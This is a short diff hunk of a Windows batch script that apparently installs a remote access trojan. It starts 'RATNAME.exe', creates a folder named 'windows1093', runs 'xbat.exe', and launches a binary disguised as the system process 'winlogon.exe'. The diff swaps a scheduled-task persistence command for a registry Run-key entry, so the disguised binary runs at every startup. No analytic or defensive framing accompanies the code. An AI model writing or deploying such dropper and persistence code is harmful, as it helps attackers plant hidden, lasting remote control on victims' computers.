@@ -14,6 +14,6 @@ start RATNAME.exe
 cd /
 mkdir windows1093
 call xbat.exe
-schtasks.exe /create /tn "9310" /sc ONLOGON /tr "C:\windows1093\winlogon.exe" /rl HIGHEST /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v windows1093 /t reg_sz /d C:\windows1093\winlogon.exe
 cd C:\windows1093
 start winlogon.exe
